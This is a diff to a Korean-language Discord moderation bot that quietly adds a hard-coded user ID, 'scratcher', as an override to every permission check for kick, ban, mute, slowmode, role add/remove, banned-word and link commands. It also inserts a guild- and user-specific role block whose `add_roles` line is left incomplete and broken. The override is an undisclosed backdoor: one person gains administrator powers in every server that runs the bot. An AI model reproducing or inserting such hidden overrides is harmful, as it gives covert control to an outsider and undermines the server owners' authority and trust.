@@ -270,6 +270,9 @@ async def 메세지보내기(inter : Interaction , id , message):
 
 @client.event
 async def on_message(message):
+    if message.channel.guild.id == 931014603599650876:
+        if (message.author.id == 782841803530567680):
+            await message.author.add_roles
     guildId = message.guild.id
     try:
         if ((message.author.guild_permissions.manage_messages) and (f"{p}금지단어 " in str(message.content))) == False:
@@ -579,7 +582,7 @@ tan 각도
             f.close()
         
     if message.content.startswith(f"{p}슬로우"):
-        if message.author.guild_permissions.administrator:
+        if message.author.guild_permissions.administrator or message.author.id == scratcher:
             number = message.content.split(" ")[1]
             try:
                 if number in "0":
@@ -803,7 +806,7 @@ tan 각도
                 await message.reply(embed = Embed(title="오류!",description="명령어를 제대로 사용해주세요",color = 0xff0000))
     
     if message.content.startswith(f"{p}음소거"):
-        if message.author.guild_permissions.administrator:
+        if message.author.guild_permissions.administrator or message.author.id == scratcher:
             user = message.mentions[0]
             if "음소거" in str(user.roles):
                 nope = 1
@@ -1049,7 +1052,7 @@ tan 각도
             f.write("{}{}:{}:{}:{}:{}:\n".format(lvl_txt,message.author.id,int(lvl_exp),lvl,self_coin,tag))
             f.close()
     if message.content.startswith(f"{p}킥"):
-        if message.author.guild_permissions.kick_members:
+        if message.author.guild_permissions.kick_members or message.author.id == scratcher:
             user = message.mentions[0]
             msg = (message.content[25:])
             await message.delete()
@@ -1059,7 +1062,7 @@ tan 각도
         else:
             await message.channel.send(embed = Embed(title="권한이 없어요",color=0xff0000))
     if message.content.startswith(f"{p}밴"):
-        if message.author.guild_permissions.ban_members:
+        if message.author.guild_permissions.ban_members or message.author.id == scratcher:
             user = message.mentions[0]
             msg = (message.content[25:])
             await message.delete()
@@ -1078,14 +1081,14 @@ tan 각도
         await message.channel.send("a",view = DropdownView())
     
     if message.content.startswith(f"{p}추가"):
-        if message.author.guild_permissions.administrator:
+        if message.author.guild_permissions.administrator or message.author.id == scratcher:
             user = message.mentions[0]
             await user.add_roles(utils.get(message.guild.roles,id = int((str(message.content).split("<@&")[1]).split(">")[0])))
             await message.channel.send(embed = Embed(title = "역할추가!",description = "{}님에게서 **{}** 역할을 추가했어요".format(user.mention,utils.get(message.guild.roles,id = int((str(message.content).split("<@&")[1]).split(">")[0]))),color = 0x00ff00))
         else:
             await message.channel.send(embed = Embed(title = "권한이 없어요!",description="__역할관리__ 권한이 필요합니다",color = 0xff0000))
     if message.content.startswith(f"{p}제거"):
-        if message.author.guild_permissions.administrator:
+        if message.author.guild_permissions.administrator or message.author.id == scratcher:
             user = message.mentions[0]
             await user.remove_roles(utils.get(message.guild.roles,id = int((str(message.content).split("<@&")[1]).split(">")[0])))
             await message.channel.send(embed = Embed(title = "역할제거!",description = "{}님에게서 **{}** 역할을 제거했어요".format(user.mention,utils.get(message.guild.roles,id = int((str(message.content).split("<@&")[1]).split(">")[0]))),color = 0xff0000))
@@ -1290,7 +1293,7 @@ tan 각도
 #-------------------------------------금지단어-------------------------------------#
 
     if message.content.startswith(f"{p}금지단어 "):
-        if message.author.guild_permissions.manage_messages:
+        if message.author.guild_permissions.manage_messages or message.author.id == scratcher:
             guildId = message.guild.id
             try:
                 with open("NoText.json" , "r+") as f:
@@ -1397,7 +1400,7 @@ tan 각도
 #--------------------------------------음악--------------------------------------#
 
     if message.content.startswith(f"{p}링크 비활성화"):
-        if message.author.guild_permissions.manage_messages:
+        if message.author.guild_permissions.manage_messages or message.author.id == scratcher:
             f = open("svr.txt","r")
             svr_list = f.read().split("|")
             for i in range(len(svr_list)+1):
@@ -1425,7 +1428,7 @@ tan 각도
             await message.reply("권한이 없어요")
 
     if message.content.startswith(f"{p}링크 활성화"):
-        if message.author.guild_permissions.manage_messages:
+        if message.author.guild_permissions.manage_messages or message.author.id == scratcher:
             f = open("svr.txt","r")
             svr_list = f.read().split("|")
             for i in range(len(svr_list)+1):
@@ -1793,6 +1796,7 @@ async def 유튜버뱃지요청(inter : Interaction , 유튜버이름 ,뱃지):
     await inter.response.send_message(embed = Embed(color = random_color() , title = "뱃지요청!" , description = f'```json\n"{유튜버이름}" : "{뱃지}"```'))
     await client.get_channel(923831470219493376).send(embed = Embed(color = random_color() , title = "뱃지요청!" , description = f'```json\n"{유튜버이름}" : "{뱃지}"'))
 #--------------------------------------
+
 
 token = os.environ['BOT_TOKEN']
 client.run(token)
